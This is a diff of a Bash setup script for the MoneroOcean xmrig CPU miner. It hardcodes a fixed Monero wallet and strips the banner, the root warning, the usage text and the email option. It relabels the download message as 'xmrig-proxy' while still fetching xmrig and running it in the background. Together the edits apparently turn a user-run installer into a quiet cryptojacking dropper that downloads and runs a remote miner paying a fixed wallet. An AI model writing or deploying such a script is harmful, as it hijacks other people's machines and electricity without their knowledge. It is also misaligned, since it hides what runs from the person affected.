@@ -1,26 +1,11 @@
 #!/bin/bash
 
-VERSION=2.11
-
-# printing greetings
-
-echo "MoneroOcean mining setup script v$VERSION."
-echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
-echo
-
-if [ "$(id -u)" == "0" ]; then
-  echo "WARNING: Generally it is not adviced to run this script under root"
-fi
-
 # command line arguments
 WALLET="46mhgUXVwfVgT1AcofHVxb8dkNQfB14DeCGgvFPTs4CK5sYfzmUW2DUETDeV8mW8HM7Dxw2GgZHJgW6xkPd21icjDE1GCem"
-EMAIL=$2 # this one is optional
 
 # checking prerequisites
 
 if [ -z $WALLET ]; then
-  echo "Script usage:"
-  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
   echo "ERROR: Please specify your wallet address"
   exit 1
 fi
@@ -46,17 +31,6 @@ if ! type curl >/dev/null; then
   echo "ERROR: This script requires \"curl\" utility to work correctly"
   exit 1
 fi
-
-if ! type lscpu >/dev/null; then
-  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
-fi
-
-#if ! sudo -n true 2>/dev/null; then
-#  if ! pidof systemd >/dev/null; then
-#    echo "ERROR: This script requires systemd to work correctly"
-#    exit 1
-#  fi
-#fi
 
 # calculating port
 
@@ -123,9 +97,6 @@ fi
 echo "I will download, setup and run in background Monero CPU miner."
 echo "If needed, miner in foreground can be started by $HOME/moneroocean/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
-if [ ! -z $EMAIL ]; then
-  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
-fi
 echo
 
 if ! sudo -n true 2>/dev/null; then
@@ -140,16 +111,7 @@ echo
 
 # start doing stuff: preparing miner
 
-echo "[*] Removing previous moneroocean miner (if any)"
-if sudo -n true 2>/dev/null; then
-  sudo systemctl stop moneroocean_miner.service
-fi
-killall -9 xmrig
-
-echo "[*] Removing $HOME/moneroocean directory"
-rm -rf $HOME/moneroocean
-
-echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
+echo "[*] Downloading xmrig-proxy to /tmp/xmrig-proxy.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
   exit 1
@@ -214,9 +176,6 @@ if [ "$PASS" == "localhost" ]; then
 fi
 if [ -z $PASS ]; then
   PASS=na
-fi
-if [ ! -z $EMAIL ]; then
-  PASS="$PASS:$EMAIL"
 fi
 
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
